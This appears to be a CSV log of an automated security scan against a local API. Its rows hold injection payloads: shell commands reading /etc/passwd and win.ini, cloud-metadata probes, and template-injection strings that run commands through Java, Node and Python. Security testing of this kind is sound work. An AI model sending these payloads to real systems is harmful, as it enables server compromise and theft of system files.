+13539,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%22%2Bresponse.write%28145.760*545.371%29%2B%22/service-rules,422,Unprocessable Entity,1,206,264
+13540,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B/service-rules,422,Unprocessable Entity,2,206,263
+13541,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/response.write%28145.760*545.371%29/service-rules,422,Unprocessable Entity,1,206,263
+13542,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13543,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,2,206,273
+13544,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,0,217,195
+13545,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13546,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/cat+%2Fetc%2Fpasswd,404,Not Found,2,195,185
+13547,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%26cat+%2Fetc%2Fpasswd%26,404,Not Found,1,195,185
+13548,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%3Bcat+%2Fetc%2Fpasswd%3B,404,Not Found,1,195,185
+13549,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%26cat+%2Fetc%2Fpasswd%26%22,404,Not Found,1,195,185
+13550,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,8,188,637
+13551,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%3Bcat+%2Fetc%2Fpasswd%3B%22,404,Not Found,1,195,185
+13552,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%26cat+%2Fetc%2Fpasswd%26%27,404,Not Found,1,195,185
+13553,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%3Bcat+%2Fetc%2Fpasswd%3B%27,404,Not Found,1,195,185
+13554,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,4,206,263
+13555,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/cat+%2Fetc%2Fpasswd/service-rules,404,Not Found,2,195,185
+13556,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/type+%25SYSTEMROOT%25%5Cwin.ini,422,Unprocessable Entity,4,206,261
+13557,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%26cat+%2Fetc%2Fpasswd%26/service-rules,404,Not Found,2,195,185
+13558,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%3Bcat+%2Fetc%2Fpasswd%3B/service-rules,404,Not Found,2,195,185
+13559,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%26type+%25SYSTEMROOT%25%5Cwin.ini,422,Unprocessable Entity,5,206,261
+13560,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%26cat+%2Fetc%2Fpasswd%26%22/service-rules,404,Not Found,1,195,185
+13561,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%3Bcat+%2Fetc%2Fpasswd%3B%22/service-rules,404,Not Found,1,195,185
+13562,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%26cat+%2Fetc%2Fpasswd%26%27/service-rules,404,Not Found,1,195,185
+13563,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,422,Unprocessable Entity,4,206,261
+13564,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%3Bcat+%2Fetc%2Fpasswd%3B%27/service-rules,404,Not Found,1,195,185
+13565,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,422,Unprocessable Entity,3,206,261
+13566,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/type+%25SYSTEMROOT%25%5Cwin.ini/service-rules,422,Unprocessable Entity,3,206,263
+13567,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,422,Unprocessable Entity,3,206,261
+13568,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%26type+%25SYSTEMROOT%25%5Cwin.ini/service-rules,422,Unprocessable Entity,5,206,263
+13569,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,422,Unprocessable Entity,3,206,261
+13570,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%7Ctype+%25SYSTEMROOT%25%5Cwin.ini/service-rules,422,Unprocessable Entity,4,206,263
+13571,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,422,Unprocessable Entity,2,206,261
+13572,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/get-help,422,Unprocessable Entity,2,206,261
+13573,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22/service-rules,422,Unprocessable Entity,3,206,263
+13574,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%3Bget-help,422,Unprocessable Entity,4,206,261
+13575,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini/service-rules,422,Unprocessable Entity,5,206,263
+13576,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%3Bget-help,422,Unprocessable Entity,3,206,261
+13577,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27/service-rules,422,Unprocessable Entity,4,206,263
+13578,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%3Bget-help,422,Unprocessable Entity,3,206,261
+13579,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini/service-rules,422,Unprocessable Entity,3,206,263
+13580,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%3Bget-help+%23,422,Unprocessable Entity,3,206,261
+13581,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/get-help/service-rules,422,Unprocessable Entity,2,206,263
+13582,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%3Bget-help/service-rules,422,Unprocessable Entity,2,206,263
+13583,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%3Bget-help/service-rules,422,Unprocessable Entity,2,206,263
+13584,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%3Bget-help/service-rules,422,Unprocessable Entity,2,206,263
+13585,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%3Bget-help+%23/service-rules,422,Unprocessable Entity,1,206,263
+13586,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13587,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,2,206,273
+13588,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13589,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,2,206,261
+13590,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%22%27,422,Unprocessable Entity,2,206,262
+13591,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,4,188,637
+13592,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,3,206,263
+13593,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3C%21--,422,Unprocessable Entity,2,206,261
+13594,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%22%27/service-rules,422,Unprocessable Entity,3,206,264
+13595,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%5D%5D%3E,422,Unprocessable Entity,2,206,261
+13596,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3C%21--/service-rules,422,Unprocessable Entity,1,206,263
+13597,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%5D%5D%3E/service-rules,422,Unprocessable Entity,2,206,263
+13598,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,0,195,185
+13599,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,1,206,273
+13600,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13601,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13602,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,2,188,637
+13603,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,1,206,263
+13604,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13605,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/latest/meta-data/,404,Not Found,1,195,185
+13606,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,0,195,185
+13607,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/latest/meta-data/,404,Not Found,1,195,185
+13608,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/computeMetadata/v1/,404,Not Found,1,195,185
+13609,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,2,206,273
+13610,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/computeMetadata/v1/,404,Not Found,0,195,185
+13611,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/opc/v1/instance/,404,Not Found,0,195,185
+13612,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,0,217,195
+13613,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/opc/v1/instance/,404,Not Found,1,195,185
+13614,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/opc/v2/instance/,404,Not Found,1,195,185
+13615,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/opc/v2/instance/,404,Not Found,1,195,185
+13616,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,3,206,261
+13617,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/latest/meta-data/,404,Not Found,1,195,185
+13618,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/latest/meta-data/,404,Not Found,1,195,185
+13619,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/metadata/instance,404,Not Found,1,195,185
+13620,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/metadata/v1,404,Not Found,2,195,185
+13621,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/openstack/latest/meta_data.json,404,Not Found,2,195,185
+13622,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj+8776*9150+zj,422,Unprocessable Entity,6,206,261
+13623,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,8,188,637
+13624,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%7B6606*4101%7Dzj,422,Unprocessable Entity,4,206,261
+13625,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,3,206,263
+13626,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%24%7B1617*5131%7Dzj,422,Unprocessable Entity,1,206,261
+13627,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj+8973*1788+zj/service-rules,422,Unprocessable Entity,2,206,263
+13628,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%23%7B9402*7746%7Dzj,422,Unprocessable Entity,1,206,261
+13629,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%7B3620*9246%7Dzj/service-rules,422,Unprocessable Entity,2,206,263
+13630,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%7B%233601*3333%7Dzj,422,Unprocessable Entity,2,206,261
+13631,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%7B%403022*2127%7Dzj,422,Unprocessable Entity,2,206,261
+13632,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%24%7B6072*8935%7Dzj/service-rules,422,Unprocessable Entity,3,206,263
+13633,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%7B%7B7893*7172%7D%7Dzj,422,Unprocessable Entity,2,206,261
+13634,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%23%7B1519*5220%7Dzj/service-rules,422,Unprocessable Entity,2,206,263
+13635,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%7B%7B%3D7950*8924%7D%7Dzj,422,Unprocessable Entity,2,206,261
+13636,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%7B%239131*4542%7Dzj/service-rules,422,Unprocessable Entity,2,206,263
+13637,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%3C%25%3D2828*1336%25%3Ezj,422,Unprocessable Entity,2,206,261
+13638,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%7B%409670*6247%7Dzj/service-rules,422,Unprocessable Entity,1,206,263
+13639,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%23set%28%24x%3D6208*9499%29%24%7Bx%7Dzj,422,Unprocessable Entity,2,206,261
+13640,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%7B%7B5515*1553%7D%7Dzj/service-rules,422,Unprocessable Entity,2,206,263
+13641,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%3Cp+th%3Atext%3D%22%24%7B9266*2379%7D%22%3E%3C%2Fp%3Ezj,404,Not Found,1,195,185
+13642,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%7B%40math+key%3D%224726%22+method%3D%22multiply%22+operand%3D%222437%22%2F%7Dzj,404,Not Found,1,195,185
+13643,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%7B%7B%3D1567*5528%7D%7Dzj/service-rules,422,Unprocessable Entity,2,206,263
+13644,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%7B%7B53040%7Cadd%3A51380%7D%7Dzj,422,Unprocessable Entity,2,206,261
+13645,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%3C%25%3D3661*5133%25%3Ezj/service-rules,422,Unprocessable Entity,2,206,263
+13646,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/zj%7B%7Bprint+%222882%22+%222462%22%7D%7Dzj,422,Unprocessable Entity,2,206,261
+13647,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%23set%28%24x%3D5543*2255%29%24%7Bx%7Dzj/service-rules,422,Unprocessable Entity,2,206,263
+13648,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%3Cp+th%3Atext%3D%22%24%7B8326*9174%7D%22%3E%3C%2Fp%3Ezj/service-rules,404,Not Found,0,195,185
+13649,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%7B%40math+key%3D%227961%22+method%3D%22multiply%22+operand%3D%229512%22%2F%7Dzj/service-rules,404,Not Found,0,195,185
+13650,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%7B%7B92390%7Cadd%3A80930%7D%7Dzj/service-rules,422,Unprocessable Entity,1,206,263
+13651,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/zj%7B%7Bprint+%227322%22+%222702%22%7D%7Dzj/service-rules,422,Unprocessable Entity,1,206,263
+13652,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,0,195,185
+13653,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,1,206,273
+13654,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,0,217,195
+13655,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,2,206,261
+13656,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,422,Unprocessable Entity,2,206,252
+13657,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,3,188,637
+13658,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,422,Unprocessable Entity,2,206,253
+13659,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13660,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,422,Unprocessable Entity,2,206,252
+13661,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,422,Unprocessable Entity,1,206,252
+13662,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D/service-rules,422,Unprocessable Entity,2,206,254
+13663,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,422,Unprocessable Entity,2,206,252
+13664,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D/service-rules,422,Unprocessable Entity,2,206,255
+13665,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,422,Unprocessable Entity,2,206,253
+13666,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D/service-rules,422,Unprocessable Entity,2,206,254
+13667,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,422,Unprocessable Entity,2,206,253
+13668,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E/service-rules,422,Unprocessable Entity,2,206,254
+13669,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,422,Unprocessable Entity,1,206,252
+13670,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D/service-rules,422,Unprocessable Entity,2,206,254
+13671,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,422,Unprocessable Entity,1,206,252
+13672,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D/service-rules,422,Unprocessable Entity,2,206,255
+13673,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3C%25%3D%25x%28sleep+15%29%25%3E,422,Unprocessable Entity,1,206,261
